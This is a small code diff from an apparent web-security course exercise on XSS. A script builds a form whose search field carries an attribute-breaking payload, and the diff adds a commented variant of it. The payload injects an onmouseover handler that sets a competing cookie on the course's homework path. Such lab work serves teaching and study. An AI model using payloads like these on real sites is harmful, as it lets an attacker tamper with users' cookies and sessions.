@@ -24,6 +24,8 @@
             inputBox.name = "searchTerm"
             inputBox.value = '"onmouseover="document.cookie=&apos;searchTerm=CompetitivePathCookie;Path=/xss/homework.php;Domain=.webappsec.cs.ut.ee&apos;"'
             form.appendChild(inputBox)
+
+            // &quot; onmouseover=&quot;document.cookie='searchTerm=CompetitivePathCookie;path=/xss/homework.php'
             
             const submitButton = document.createElement("submit")
             submitButton.value = "Search"
